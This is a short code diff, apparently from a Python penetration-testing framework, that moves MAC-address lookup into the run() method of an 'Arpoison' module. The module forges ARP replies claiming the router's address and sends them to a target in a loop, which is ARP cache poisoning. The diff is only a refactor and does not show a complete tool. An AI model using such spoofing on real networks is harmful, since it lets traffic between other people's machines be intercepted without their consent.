@@ -19,7 +19,7 @@ class Arpoison(Module):
                            'e.g. eth0',],
         })
 
-    def setup(self):
+    def run(self):
         mac = None
         try:
             mac = network.get_mac(self.interface)
@@ -27,10 +27,8 @@ class Arpoison(Module):
             self.console.error("interface '%s' not found." % self.interface)
             return
 
-        self.mac = mac
+        arp = ARP(op=1, psrc=self.router, pdst=self.target, hwdst=mac)
 
-    def run(self):
-        arp = ARP(op=1, psrc=self.router, pdst=self.target, hwdst=self.mac)
         self.console.writeln('[+] sending packets... press Ctrl+C to quit.')
         try:
             while True:
